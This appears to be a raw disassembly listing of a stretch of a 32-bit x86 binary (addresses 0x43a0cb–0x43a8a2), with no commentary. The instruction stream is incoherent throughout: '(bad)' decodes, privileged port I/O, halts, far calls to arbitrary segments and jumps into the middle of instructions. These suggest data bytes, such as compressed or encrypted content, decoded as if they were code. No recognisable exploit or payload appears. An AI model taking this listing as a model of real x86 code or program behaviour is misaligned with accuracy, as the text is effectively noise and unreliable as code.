  43a0cb:	xor    ah,BYTE PTR [ebp+eiz*8-0x7846279a]
  43a0d2:	aad    0x33
  43a0d4:	dec    edx
  43a0d5:	call   0xabb558c
  43a0da:	add    BYTE PTR [eax-0x2d50e1d3],0x16
  43a0e1:	jno    0x43a11b
  43a0e3:	mov    eax,ds:0x2885b8c9
  43a0e8:	cli    
  43a0e9:	mov    ecx,0xa0d9a93e
  43a0ee:	retf   
  43a0ef:	in     eax,dx
  43a0f0:	retf   0xfff1
  43a0f3:	push   cs
  43a0f4:	dec    esp
  43a0f5:	mov    ds:0xc33f7ab,al
  43a0fa:	dec    eax
  43a0fb:	out    dx,al
  43a0fc:	int3   
  43a0fd:	dec    ecx
  43a0fe:	stc    
  43a0ff:	pop    es
  43a100:	cmc    
  43a101:	and    al,0xba
  43a103:	hlt    
  43a104:	in     eax,dx
  43a105:	pop    ebx
  43a106:	les    esi,FWORD PTR [edx-0x64274557]
  43a10c:	imul   ecx,DWORD PTR [esi+0x973ccbe],0xffffff83
  43a113:	dec    ecx
  43a114:	inc    edi
  43a115:	mov    ?,WORD PTR [eax+0x2e1b1e54]
  43a11b:	push   ebx
  43a11c:	jne    0x43a186
  43a11e:	jmp    ebp
  43a120:	(bad)  
  43a121:	jnp    0x43a10b
  43a123:	mov    edi,0xb0731917
  43a128:	aad    0xd3
  43a12a:	int    0xb0
  43a12c:	cdq    
  43a12d:	pop    ebx
  43a12e:	lods   al,BYTE PTR ds:[esi]
  43a12f:	dec    ebp
  43a130:	loopne 0x43a0d5
  43a132:	xchg   esp,eax
  43a133:	loop   0x43a14c
  43a135:	or     DWORD PTR [ebp-0x55506641],edx
  43a13b:	jle    0x43a0c6
  43a13d:	mov    ds:0x50f95c4b,eax
  43a142:	icebp  
  43a143:	mov    ebp,0xbca8a7df
  43a148:	push   edi
  43a149:	test   BYTE PTR [edi-0x5665b81a],cl
  43a14f:	adc    DWORD PTR [edx],edx
  43a151:	outs   dx,DWORD PTR ds:[esi]
  43a152:	popf   
  43a153:	mov    ss,WORD PTR [ebp-0x23]
  43a156:	cwde   
  43a157:	hlt    
  43a158:	call   0x7df8a52
  43a15d:	imul   ecx,DWORD PTR [edi+0x5b],0x18
  43a161:	add    DWORD PTR [edx+0x32],ebx
  43a164:	add    eax,0xc67f147c
  43a169:	add    DWORD PTR [esi],ebx
  43a16b:	pop    edx
  43a16c:	rcr    DWORD PTR [ecx+esi*1-0x3d],1
  43a170:	jmp    FWORD PTR [esp+esi*1+0x2ae259c4]
  43a177:	mov    DWORD PTR [eax+ebp*2-0x44],edx
  43a17b:	adc    al,0x0
  43a17d:	xchg   DWORD PTR [edx+0x7ed72586],ebx
  43a183:	out    0x2b,al
  43a185:	push   0xa922d253
  43a18a:	fwait
  43a18b:	fwait
  43a18c:	lods   eax,DWORD PTR ds:[esi]
  43a18d:	shr    BYTE PTR [edx+0x6bd7bfbe],0x55
  43a194:	aad    0xf2
  43a196:	jg     0x43a209
  43a198:	cs enter 0x6e3d,0x71
  43a19d:	xlat   BYTE PTR ds:[ebx]
  43a19e:	sub    edi,esp
  43a1a0:	call   0x7d78602e
  43a1a5:	call   FWORD PTR [edi-0x9d57a6d]
  43a1ab:	in     eax,0xad
  43a1ad:	mov    dl,0xa4
  43a1af:	iret   
  43a1b0:	and    ebp,ecx
  43a1b2:	xlat   BYTE PTR ds:[ebx]
  43a1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a1b4:	shl    BYTE PTR [ebx+0x6c],0x4b
  43a1b8:	mov    ebp,ecx
  43a1ba:	mov    WORD PTR [edx-0x20645db3],?
  43a1c0:	cwde   
  43a1c1:	pop    esp
  43a1c2:	push   eax
  43a1c3:	dec    BYTE PTR [eax-0x6e6dc176]
  43a1c9:	lds    esi,FWORD PTR [ebp-0x80]
  43a1cc:	inc    ebx
  43a1cd:	(bad)  [ebp-0x3460a216]
  43a1d3:	jb     0x43a251
  43a1d5:	fisubr WORD PTR [ebx-0xf]
  43a1d8:	lahf   
  43a1d9:	or     esi,DWORD PTR [esi]
  43a1db:	shl    DWORD PTR ds:0x8284b1b2,cl
  43a1e1:	mov    bl,0xbb
  43a1e3:	test   BYTE PTR ss:[ebp+ebx*4-0x205f33f1],al
  43a1eb:	pop    es
  43a1ec:	jo     0x43a182
  43a1ee:	inc    esp
  43a1ef:	inc    ecx
  43a1f0:	stc    
  43a1f1:	(bad)  
  43a1f3:	fs mov eax,0xd5e60c21
  43a1f9:	cmp    edx,ebx
  43a1fb:	lds    esi,FWORD PTR ds:0x7fe774c6
  43a201:	(bad)  
  43a202:	call   0xc8c5:0xf9c7fce9
  43a209:	lods   eax,DWORD PTR ds:[esi]
  43a20a:	mov    ebx,0x8d5e4ae4
  43a20f:	jo     0x43a1f9
  43a211:	fld    st(3)
  43a213:	dec    edi
  43a214:	test   DWORD PTR [ebp-0x7580e02],edx
  43a21a:	cdq    
  43a21b:	add    eax,0x24bacf7d
  43a220:	mov    ch,0x4
  43a222:	ret    
  43a223:	ins    DWORD PTR es:[edi],dx
  43a224:	pushf  
  43a225:	popf   
  43a226:	pop    ebx
  43a227:	stc    
  43a228:	jnp    0x43a288
  43a22a:	push   esi
  43a22b:	icebp  
  43a22c:	gs mov ebx,0x7cda4d9c
  43a232:	loopne 0x43a278
  43a234:	xchg   esp,eax
  43a235:	xor    esp,DWORD PTR [ebx]
  43a237:	loope  0x43a24e
  43a239:	(bad)  
  43a23a:	std    
  43a23b:	lock sbb edx,DWORD PTR [edx-0x66e2b175]
  43a242:	jae    0x43a1f6
  43a244:	dec    esi
  43a245:	icebp  
  43a246:	xor    BYTE PTR [ebp+0x16cb9c0f],cl
  43a24c:	fld    TBYTE PTR [edx+0x8e26013]
  43a252:	popf   
  43a253:	sbb    DWORD PTR [ecx+0x22],esi
  43a256:	mov    ebx,0xc44514f4
  43a25b:	aam    0x35
  43a25d:	cmp    DWORD PTR [esi+ebp*8-0x7b],ebx
  43a261:	push   ss
  43a262:	add    al,0x5d
  43a264:	nop
  43a265:	fnstcw WORD PTR [esi]
  43a267:	or     eax,0x9a5b71d2
  43a26c:	rcl    DWORD PTR [edi-0x49],1
  43a26f:	test   BYTE PTR [esi+0x6332fe07],0xb4
  43a276:	shl    DWORD PTR [edi-0x7b96176e],cl
  43a27c:	mov    bh,BYTE PTR [ecx+0x74]
  43a27f:	outs   dx,BYTE PTR ds:[esi]
  43a280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a281:	ds jge 0x43a21e
  43a284:	cmp    al,0x67
  43a286:	mov    ebx,0xb36e46e2
  43a28b:	or     ebp,edx
  43a28d:	(bad)  
  43a28f:	adc    cl,bh
  43a291:	das    
  43a292:	mov    ecx,0x2841a742
  43a297:	in     eax,0x1a
  43a299:	push   edx
  43a29a:	sti    
  43a29b:	sub    edx,DWORD PTR [ecx]
  43a29d:	mov    al,ds:0xf669076b
  43a2a2:	stos   DWORD PTR es:[edi],eax
  43a2a3:	and    al,0x69
  43a2a5:	mov    ?,WORD PTR [edx+0x16a920d7]
  43a2ab:	fmul   st(6),st
  43a2ad:	xor    bh,BYTE PTR [esi-0x40b519b8]
  43a2b3:	fistp  WORD PTR ds:0xc06626d1
  43a2b9:	inc    edx
  43a2ba:	loope  0x43a32f
  43a2bc:	pop    ds
  43a2bd:	dec    ecx
  43a2be:	and    BYTE PTR [ecx-0x65],dl
  43a2c1:	push   edx
  43a2c2:	jle    0x43a2f8
  43a2c4:	mov    ecx,0x9ea22bc5
  43a2c9:	into   
  43a2ca:	clc    
  43a2cb:	push   ds
  43a2cc:	add    dl,BYTE PTR [edx+0x53422dea]
  43a2d2:	mov    ecx,0xd71adfa6
  43a2d7:	add    BYTE PTR [eax],dh
  43a2d9:	rol    edx,1
  43a2db:	call   0xa8bc:0xcbb9488c
  43a2e2:	mov    ebx,0x53dfa376
  43a2e7:	cmp    DWORD PTR [esi-0xd],esi
  43a2ea:	stos   DWORD PTR es:[edi],eax
  43a2eb:	shr    BYTE PTR [edi],0xbc
  43a2ee:	mov    bh,0x24
  43a2f0:	xor    BYTE PTR [esi+0x18351d95],bl
  43a2f6:	push   edx
  43a2f7:	in     eax,0x7b
  43a2f9:	fs scas al,BYTE PTR es:[edi]
  43a2fb:	fdivr  st,st(6)
  43a2fd:	test   eax,0xa3edb291
  43a302:	jns    0x43a368
  43a304:	inc    ebx
  43a305:	jae    0x43a2a9
  43a307:	adc    DWORD PTR [edi+0x73],esi
  43a30a:	xchg   esp,eax
  43a30b:	stos   DWORD PTR es:[edi],eax
  43a30c:	fnsave [eax+ebx*4]
  43a30f:	jmp    0x98bada9
  43a314:	cdq    
  43a315:	xor    eax,0x491636f5
  43a31a:	xchg   edi,eax
  43a31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a31c:	inc    edx
  43a31d:	mov    esp,0x89851b8d
  43a322:	push   ebx
  43a323:	cld    
  43a324:	leave  
  43a325:	ret    0x63a1
  43a328:	mov    ds:0x8eb1f440,al
  43a32d:	(bad)  
  43a32e:	jl     0x43a2c9
  43a330:	or     al,0x9e
  43a332:	lds    eax,FWORD PTR [edi-0xa]
  43a335:	hlt    
  43a336:	sub    edx,0xe7b63e85
  43a33c:	push   eax
  43a33d:	stc    
  43a33e:	lods   eax,DWORD PTR ds:[esi]
  43a33f:	jnp    0x43a35e
  43a341:	leave  
  43a342:	mov    edx,0xd4c51378
  43a347:	outs   dx,BYTE PTR ds:[esi]
  43a348:	cs popf 
  43a34a:	mov    ebx,0x60c86589
  43a34f:	ror    DWORD PTR [edi+ebp*4],cl
  43a352:	mov    al,0x71
  43a354:	xchg   BYTE PTR [edx-0x44],cl
  43a357:	xor    al,0xc9
  43a359:	adc    eax,0x49561a56
  43a35e:	fcmovnb st,st(7)
  43a360:	and    al,0x27
  43a362:	or     ah,0xe
  43a365:	mov    esi,0x41dd6dd8
  43a36a:	popf   
  43a36b:	data16 lods al,BYTE PTR ds:[esi]
  43a36d:	test   esi,eax
  43a36f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a370:	and    dl,BYTE PTR [ebp-0x71]
  43a373:	jmp    ebp
  43a375:	icebp  
  43a376:	dec    eax
  43a377:	out    dx,al
  43a378:	xchg   ecx,eax
  43a379:	ja     0x43a337
  43a37b:	popa   
  43a37c:	sbb    BYTE PTR [ecx+0x343998bf],ch
  43a382:	lock inc ebx
  43a384:	lods   eax,DWORD PTR ds:[esi]
  43a385:	cdq    
  43a386:	fcomi  st,st(7)
  43a388:	xchg   ebp,eax
  43a389:	and    DWORD PTR [edx-0x26],esi
  43a38c:	or     BYTE PTR [ebx+edx*2+0x70],bl
  43a390:	ins    DWORD PTR es:[edi],dx
  43a391:	test   al,0x3b
  43a393:	imul   ebx,DWORD PTR [ecx-0x4a],0x9ef39d57
  43a39a:	mov    ebx,0x6ff742bb
  43a39f:	jae    0x43a36e
  43a3a1:	mov    ch,0x65
  43a3a3:	push   edi
  43a3a4:	outs   dx,DWORD PTR ds:[esi]
  43a3a5:	or     DWORD PTR [ecx+0x4c],edi
  43a3a8:	and    DWORD PTR [ebp+0x30b6ad13],ebx
  43a3ae:	mov    dh,0x4c
  43a3b0:	add    eax,0x5ce6ebb9
  43a3b5:	pop    edi
  43a3b6:	push   ebx
  43a3b7:	std    
  43a3b8:	pop    ds
  43a3b9:	jmp    0x58b36839
  43a3be:	mov    eax,0x3b9f98cb
  43a3c3:	retf   0x7fc8
  43a3c6:	mov    bh,0xae
  43a3c8:	xchg   dh,bl
  43a3ca:	clc    
  43a3cb:	dec    esp
  43a3cc:	sbb    eax,0x8c6bb909
  43a3d1:	lods   al,BYTE PTR ds:[esi]
  43a3d2:	push   0xffffff93
  43a3d4:	jg     0x43a3f6
  43a3d6:	pop    ds
  43a3d7:	jmp    0x43a35b
  43a3d9:	mov    BYTE PTR [edi],bl
  43a3db:	and    BYTE PTR [esi],ch
  43a3dd:	jno    0x43a43b
  43a3df:	push   ss
  43a3e0:	les    edx,FWORD PTR [esi-0x3f3d8e15]
  43a3e6:	mov    bl,0x2c
  43a3e8:	add    al,0xd5
  43a3ea:	inc    edi
  43a3eb:	jae    0x43a3a9
  43a3ed:	mov    ds:0xf8e3659e,al
  43a3f2:	(bad)
  43a3f5:	lahf   
  43a3f6:	dec    ebx
  43a3f7:	cmp    ecx,DWORD PTR [edx]
  43a3f9:	into   
  43a3fa:	xchg   esi,eax
  43a3fb:	adc    eax,0x6e3203b0
  43a400:	stos   BYTE PTR es:[edi],al
  43a401:	pop    es
  43a402:	jg     0x43a38a
  43a404:	aaa    
  43a405:	jno    0x43a3b1
  43a407:	lods   al,BYTE PTR ds:[esi]
  43a408:	stc    
  43a409:	add    al,0xaf
  43a40b:	popa   
  43a40c:	cld    
  43a40d:	(bad)  ds:0xb54b6fd5
  43a413:	aam    0x84
  43a415:	call   0x89c0:0xa04cc1b
  43a41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a41d:	sub    al,0xb5
  43a41f:	jecxz  0x43a3db
  43a421:	nop
  43a422:	adc    esp,DWORD PTR [esi]
  43a424:	mov    ch,0x63
  43a426:	mov    edi,0x6ba53624
  43a42b:	and    DWORD PTR [edx*2-0x57ba1a53],ecx
  43a432:	idiv   BYTE PTR ss:[ebp-0x33]
  43a436:	mov    ah,0x34
  43a438:	(bad)  
  43a439:	div    DWORD PTR [ebp+ecx*4-0xec108bb]
  43a440:	repz pop ss
  43a442:	push   ss
  43a443:	xor    DWORD PTR [ecx+ebx*4],ebx
  43a446:	mov    BYTE PTR [ebx+edi*2-0x43be8de3],ah
  43a44d:	mov    ds:0x14194dcb,eax
  43a452:	sub    bh,dl
  43a454:	aam    0xd4
  43a456:	or     bh,ch
  43a458:	xor    ebp,DWORD PTR [eax-0x42]
  43a45b:	push   esp
  43a45c:	push   es
  43a45d:	xchg   BYTE PTR [ecx-0xfc8a36],al
  43a463:	jmp    0x43a43d
  43a465:	in     eax,0x3b
  43a467:	or     al,0x25
  43a469:	sbb    edi,esi
  43a46b:	test   eax,0xd230857c
  43a470:	mov    bl,0x97
  43a472:	pop    esp
  43a473:	and    al,0x24
  43a475:	sbb    ch,BYTE PTR [ebp-0x478d8d20]
  43a47b:	mul    BYTE PTR [ebx]
  43a47d:	dec    ecx
  43a47e:	mov    ecx,0x39ec465d
  43a483:	mov    edi,0x76999a95
  43a488:	add    eax,0xecf54350
  43a48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a48e:	(bad)  
  43a48f:	cld    
  43a490:	in     al,0x8d
  43a492:	fcomi  st,st(3)
  43a494:	(bad)  
  43a495:	sub    eax,0xa0f67bff
  43a49a:	cmp    DWORD PTR [esp+eiz*4+0x56c82ba8],esp
  43a4a1:	jae    0x43a424
  43a4a3:	jae    0x43a4fc
  43a4a5:	lea    eax,[ebx]
  43a4a7:	xchg   ecx,eax
  43a4a8:	or     DWORD PTR [esi-0x14376b44],eax
  43a4ae:	xchg   BYTE PTR [ecx-0x12b54f7b],al
  43a4b4:	jmp    0x43a4a4
  43a4b6:	test   DWORD PTR [edi+ebx*1+0x507b1d09],eax
  43a4bd:	fwait
  43a4be:	dec    esi
  43a4bf:	(bad)  
  43a4c0:	xchg   esi,eax
  43a4c1:	mov    al,ds:0x65f39a5b
  43a4c6:	aad    0xe0
  43a4c8:	cmp    al,0x10
  43a4ca:	data16 fst QWORD PTR [edi]
  43a4cd:	sbb    DWORD PTR [ebp-0x3dae82f3],edi
  43a4d3:	adc    eax,0x396b9b25
  43a4d8:	rcl    BYTE PTR [ebp-0x7b16c377],cl
  43a4de:	pop    esp
  43a4df:	dec    ecx
  43a4e0:	xchg   ebx,eax
  43a4e1:	fdivr  QWORD PTR [esi+0x7d379104]
  43a4e7:	fidiv  WORD PTR [edi-0x47]
  43a4ea:	push   ds
  43a4eb:	leave  
  43a4ec:	xchg   ecx,eax
  43a4ed:	xchg   ebp,eax
  43a4ee:	push   edx
  43a4ef:	out    dx,eax
  43a4f0:	dec    eax
  43a4f1:	(bad)  
  43a4f3:	retf   0xcdd7
  43a4f6:	mov    ebx,0xbff18444
  43a4fb:	xor    esi,DWORD PTR [esi]
  43a4fd:	push   edi
  43a4fe:	retf   0xfe55
  43a501:	sahf   
  43a502:	pop    edx
  43a503:	xchg   ebp,eax
  43a504:	into   
  43a505:	sahf   
  43a506:	arpl   WORD PTR [esi],bx
  43a508:	loop   0x43a4f7
  43a50a:	mov    eax,0x57dda164
  43a50f:	repz inc ebp
  43a511:	cwde   
  43a512:	psubsw mm0,mm6
  43a515:	stos   BYTE PTR es:[edi],al
  43a516:	inc    eax
  43a517:	inc    ebx
  43a518:	jl     0x43a515
  43a51a:	mov    bl,0x6a
  43a51c:	gs call 0xbdf2:0xc767728d
  43a524:	rcr    BYTE PTR [ecx-0x39e7a57],cl
  43a52a:	push   ecx
  43a52b:	stos   BYTE PTR es:[edi],al
  43a52c:	sub    eax,0xe9c6eb9a
  43a531:	js     0x43a4f0
  43a533:	sbb    cl,BYTE PTR [ebx-0x7fbb535f]
  43a539:	sub    eax,0x89170504
  43a53e:	push   esi
  43a53f:	aam    0x3c
  43a541:	and    BYTE PTR [ecx+0x30487519],0xe8
  43a548:	jg     0x43a4cf
  43a54a:	aad    0x50
  43a54c:	and    BYTE PTR [ecx],ch
  43a54e:	xchg   dl,ah
  43a550:	mov    ebx,0xdff4a9ec
  43a555:	jns    0x43a5b6
  43a557:	mov    ds:0x98e76a43,al
  43a55c:	test   DWORD PTR [edi-0x38],eax
  43a55f:	out    dx,al
  43a560:	adc    BYTE PTR [ecx+0x65],ah
  43a563:	lods   eax,DWORD PTR ds:[esi]
  43a564:	enter  0xe4b0,0xc4
  43a568:	test   al,0x9c
  43a56a:	jbe    0x43a4fc
  43a56c:	ds xchg ebx,eax
  43a56e:	out    dx,eax
  43a56f:	mov    edi,0x67499919
  43a574:	pop    edx
  43a575:	mov    edx,0x94abbc4
  43a57a:	lahf   
  43a57b:	lods   al,BYTE PTR ds:[esi]
  43a57c:	push   eax
  43a57d:	aad    0xc
  43a57f:	inc    ebp
  43a580:	push   cs
  43a581:	bound  eax,QWORD PTR [esi]
  43a583:	jno    0x43a58a
  43a585:	cmp    ch,BYTE PTR [edi-0x13]
  43a588:	dec    eax
  43a589:	or     esi,DWORD PTR [eax]
  43a58b:	jb     0x43a5b2
  43a58d:	repnz shl DWORD PTR ds:0xd31e6da9,1
  43a595:	lahf   
  43a596:	sar    BYTE PTR [esi+0x7275fc20],0x5
  43a59d:	aam    0xcb
  43a59f:	jmp    0x43a5e7
  43a5a1:	xchg   edx,eax
  43a5a2:	xor    dh,BYTE PTR [ebx]
  43a5a4:	pop    ss
  43a5a5:	or     DWORD PTR [eax],ebp
  43a5a7:	rcr    BYTE PTR [esi],cl
  43a5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a5aa:	out    0xab,eax
  43a5ac:	lds    ebx,FWORD PTR [ecx+0x62e6adab]
  43a5b2:	aad    0xd1
  43a5b4:	jle    0x43a58e
  43a5b6:	dec    esi
  43a5b7:	mov    bh,0x93
  43a5b9:	lahf   
  43a5ba:	imul   ebp,DWORD PTR [eax],0x21
  43a5bd:	test   BYTE PTR fs:[edi-0x7bfca9f2],bh
  43a5c4:	jne    0x43a566
  43a5c6:	adc    esp,edi
  43a5c8:	fist   DWORD PTR [esi+0x7c]
  43a5cb:	add    BYTE PTR [edi-0x49],0xe8
  43a5cf:	mov    bl,0xb5
  43a5d1:	fisttp WORD PTR [edx+0x77]
  43a5d4:	push   ss
  43a5d5:	leave  
  43a5d6:	ror    DWORD PTR [edx],cl
  43a5d8:	shl    dl,1
  43a5da:	pop    ss
  43a5db:	sbb    DWORD PTR ds:0x9bc50ba7,ebp
  43a5e1:	push   0x3eaceb61
  43a5e6:	mov    ebx,0xb43efb7c
  43a5eb:	adc    al,0xa9
  43a5ed:	mov    BYTE PTR [edi],bh
  43a5ef:	call   0x2039:0xea1bd625
  43a5f6:	fidivr DWORD PTR [ecx-0x5ecad6e1]
  43a5fc:	mov    esp,es
  43a5fe:	inc    esp
  43a5ff:	lds    edx,FWORD PTR [edx+0x2031fb9d]
  43a605:	idiv   BYTE PTR [ebp-0x23]
  43a608:	push   es
  43a609:	xchg   ebp,eax
  43a60a:	inc    ecx
  43a60b:	mov    WORD PTR [ebx],cs
  43a60d:	mov    edi,DWORD PTR [edi+0x288360b4]
  43a613:	test   DWORD PTR fs:[esi],esp
  43a616:	shr    DWORD PTR [eax-0xb336e9],0xad
  43a61d:	sbb    eax,0xa777d4ca
  43a622:	jecxz  0x43a5be
  43a624:	sbb    DWORD PTR [ecx-0x249ccc0b],edi
  43a62a:	xchg   edx,eax
  43a62b:	adc    eax,0x8b649ce2
  43a630:	cmc    
  43a631:	mov    eax,0xba83eb7c
  43a636:	std    
  43a637:	fs cmp dh,al
  43a63a:	mov    esp,DWORD PTR [esi-0x6b357ab0]
  43a640:	push   eax
  43a641:	push   edx
  43a642:	inc    esp
  43a643:	and    al,0x70
  43a645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a646:	mov    ebx,0x9b0ebf76
  43a64b:	push   DWORD PTR [eax-0x62c61366]
  43a651:	cdq    
  43a652:	mov    ecx,0xadd51674
  43a657:	push   ecx
  43a658:	data16 and cl,BYTE PTR [edi+0x4a2d23]
  43a65f:	pop    ss
  43a660:	or     DWORD PTR [eax+0x38],edx
  43a663:	repnz adc BYTE PTR [ecx],bh
  43a666:	leave  
  43a667:	xor    al,0x7e
  43a669:	cmp    DWORD PTR [ecx+0x73252ec7],esi
  43a66f:	jb     0x43a666
  43a671:	fdivr  st(4),st
  43a673:	out    dx,eax
  43a674:	xlat   BYTE PTR ds:[ebx]
  43a675:	dec    eax
  43a676:	dec    edx
  43a677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a678:	cmp    eax,DWORD PTR [eax+0x7d38086a]
  43a67e:	mov    dl,0x44
  43a680:	fcomp  st(2)
  43a682:	ds dec ch
  43a685:	popf   
  43a686:	or     edx,DWORD PTR [edi-0x61]
  43a689:	push   ecx
  43a68a:	lods   eax,DWORD PTR ds:[esi]
  43a68b:	mov    edi,0x9ccf4a22
  43a690:	pop    esp
  43a692:	mov    edi,0x3ebea6e4
  43a697:	shr    DWORD PTR [ebp-0x5b],1
  43a69a:	pop    ebx
  43a69b:	jnp    0x43a6f8
  43a69d:	jno    0x43a681
  43a69f:	sub    BYTE PTR [ebp+ebp*8+0x530883e9],bh
  43a6a6:	mov    esp,0x160b6b94
  43a6ab:	loope  0x43a662
  43a6ad:	mov    edx,0x9a2be803
  43a6b2:	and    eax,0xc89025b0
  43a6b7:	push   0x3
  43a6b9:	pop    edx
  43a6ba:	jb     0x43a730
  43a6bc:	mov    fs,WORD PTR [ebx-0x4e8a2c1d]
  43a6c2:	pop    ebp
  43a6c3:	add    eax,DWORD PTR ds:0xfbe9c19b
  43a6c9:	adc    al,0x17
  43a6cb:	bound  esp,QWORD PTR [ecx+ebx*4]
  43a6ce:	dec    ecx
  43a6cf:	xor    DWORD PTR [edi-0x79f4792],esp
  43a6d5:	xchg   BYTE PTR [ebx+0x7ba084cc],cl
  43a6db:	push   0xffffffad
  43a6dd:	push   ebp
  43a6de:	imul   eax,DWORD PTR [edi],0xfffffff0
  43a6e1:	mov    dh,ah
  43a6e3:	fisttp QWORD PTR [esi+0x75fa7f26]
  43a6e9:	test   eax,ebp
  43a6eb:	jmp    0x997d:0x80266f13
  43a6f2:	mov    ebx,0x1c7f2906
  43a6f7:	loopne 0x43a756
  43a6f9:	test   eax,0x117eb68d
  43a6fe:	xchg   esi,eax
  43a6ff:	(bad)  
  43a700:	or     BYTE PTR [eax-0x44],bl
  43a703:	clc    
  43a704:	xchg   edi,eax
  43a705:	fwait
  43a706:	stos   DWORD PTR es:[edi],eax
  43a707:	pushf  
  43a708:	push   es
  43a709:	xchg   esp,eax
  43a70a:	xor    BYTE PTR ds:0x5041f64b,al
  43a710:	lds    eax,FWORD PTR [edi-0x22289b3c]
  43a716:	(bad)  
  43a717:	jo     0x43a73c
  43a719:	(bad)  
  43a71b:	mov    cl,0x36
  43a71d:	cwde   
  43a71e:	je     0x43a75a
  43a720:	loop   0x43a75e
  43a722:	sti    
  43a723:	sub    cl,BYTE PTR [ebp+0x6510b6fd]
  43a729:	pop    eax
  43a72a:	mov    bl,0xf2
  43a72c:	dec    esi
  43a72d:	mov    ?,WORD PTR [edi]
  43a72f:	push   esp
  43a730:	mov    ah,0x30
  43a732:	xchg   esi,eax
  43a733:	fistp  DWORD PTR [eax]
  43a735:	sub    DWORD PTR ds:0x69d5ccac,esi
  43a73b:	mov    bh,0xc3
  43a73d:	sahf   
  43a73e:	sti    
  43a73f:	and    esi,ecx
  43a741:	jno    0x43a716
  43a743:	call   0x9cb8:0x3d9327d3
  43a74a:	inc    BYTE PTR [edx-0x199ccad3]
  43a750:	aaa    
  43a751:	push   0xfffffffb
  43a753:	iret   
  43a754:	test   DWORD PTR [eax-0x30],eax
  43a757:	lock pushf 
  43a759:	(bad)  
  43a75a:	adc    ch,BYTE PTR [ebx*1+0x433969]
  43a761:	ds push esi
  43a763:	pop    ss
  43a764:	xchg   ebx,eax
  43a765:	adc    DWORD PTR [ecx+ebx*1-0x194232e],ebp
  43a76c:	xor    dl,BYTE PTR [ebx-0x3]
  43a76f:	in     al,dx
  43a770:	and    ch,BYTE PTR [ecx+0x66]
  43a773:	lahf   
  43a774:	xchg   esi,eax
  43a775:	xchg   ebx,eax
  43a776:	cs dec esi
  43a778:	shr    DWORD PTR [eax-0x4eb80415],0x43
  43a77f:	loop   0x43a71c
  43a781:	pop    ecx
  43a782:	aaa    
  43a783:	bound  ebx,QWORD PTR [esi]
  43a785:	mov    edx,ebp
  43a787:	dec    ebx
  43a788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a789:	mov    ?,WORD PTR [ebp-0xb]
  43a78c:	or     eax,0x1b33b97
  43a791:	call   0x7092:0xcc1c71fb
  43a798:	push   0x20
  43a79a:	mov    ds,WORD PTR [ebx]
  43a79c:	mov    ch,ch
  43a79e:	lods   al,BYTE PTR ds:[esi]
  43a79f:	ss dec ebp
  43a7a1:	xor    eax,0xf776e8a8
  43a7a6:	dec    eax
  43a7a7:	mov    dh,0xe5
  43a7a9:	cmp    eax,0xbbdce80f
  43a7ae:	xor    BYTE PTR [edi+0x22],cl
  43a7b1:	(bad)  
  43a7b3:	fdiv   QWORD PTR [edx-0x4803b90a]
  43a7b9:	mov    al,ds:0xdc3b629b
  43a7be:	pop    ecx
  43a7bf:	xchg   edi,eax
  43a7c0:	xchg   ebx,eax
  43a7c1:	arpl   WORD PTR [edi+0x6f],bx
  43a7c4:	add    BYTE PTR [edx-0x47],ch
  43a7c7:	iret   
  43a7c8:	repz popf 
  43a7ca:	mov    ebx,0xdfc19883
  43a7cf:	jmp    0x43a7c7
  43a7d1:	mov    edx,0xfe68240d
  43a7d6:	inc    ebx
  43a7d7:	sti    
  43a7d8:	in     eax,dx
  43a7d9:	mov    ds:0xb950ee0f,al
  43a7de:	ret    
  43a7df:	xchg   BYTE PTR [esp+edi*8+0x50cf931d],ah
  43a7e6:	and    al,0x72
  43a7e8:	xor    eax,0x62f27afc
  43a7ed:	mul    DWORD PTR [ebx-0x21a6e234]
  43a7f3:	imul   ebx,DWORD PTR [ebx+0x40],0x2e6f70ea
  43a7fa:	inc    ebp
  43a7fc:	test   bl,ch
  43a7fe:	(bad)  
  43a7ff:	fiadd  WORD PTR [ebp+0x48e8eee1]
  43a805:	xor    BYTE PTR [ebx+edi*4],bh
  43a808:	adc    al,0xc3
  43a80a:	mov    ah,0xb4
  43a80c:	mov    eax,0x754d5485
  43a811:	sub    edx,edx
  43a813:	jmp    0x5916:0xf126df5f
  43a81a:	add    eax,0x1cb8bfec
  43a81f:	into   
  43a820:	xchg   edx,eax
  43a821:	xchg   BYTE PTR [eax+eax*8-0x5b39eadf],cl
  43a828:	xchg   ebx,eax
  43a829:	in     eax,dx
  43a82a:	sub    bh,BYTE PTR [ebx]
  43a82c:	cmp    eax,0x16ecffcc
  43a831:	mov    esi,ebp
  43a833:	out    dx,eax
  43a834:	mov    ds:0xe3d45b4c,al
  43a839:	iret   
  43a83a:	fwait
  43a83b:	daa    
  43a83c:	call   0x1eea3b7b
  43a841:	rcl    DWORD PTR [edx-0x3e279cce],cl
  43a847:	jmp    0x1a98:0x75a974e3
  43a84e:	sbb    al,0x5c
  43a850:	xor    edi,DWORD PTR fs:[ebx-0x613099aa]
  43a857:	xlat   BYTE PTR ds:[ebx]
  43a858:	std    
  43a859:	push   edi
  43a85a:	and    DWORD PTR [ecx-0x2147c77b],edx
  43a860:	(bad)  
  43a861:	fdivr  QWORD PTR [ebp+0xd]
  43a864:	mov    cl,BYTE PTR [edx]
  43a866:	or     al,0xac
  43a868:	pop    edx
  43a869:	int3   
  43a86a:	lock loope 0x43a8d5
  43a86d:	sbb    edi,DWORD PTR [edi-0x3227ab1]
  43a873:	jmp    0xe3fd622a
  43a878:	sbb    eax,0x28
  43a87b:	mov    bh,0x9f
  43a87d:	jmp    0x4d44:0x659f1332
  43a884:	addr16 adc eax,0x87dbc8ab
  43a88a:	sub    al,0xc8
  43a88c:	and    cl,BYTE PTR [ebx-0x7f6e4dd7]
  43a892:	or     edi,DWORD PTR [edi-0x597098b8]
  43a898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a899:	cmp    al,0x2a
  43a89b:	in     eax,0x23
  43a89d:	sbb    DWORD PTR [esi+0x33],edx
  43a8a0:	add    ecx,DWORD PTR [edx]
  43a8a2:	in     al,dx
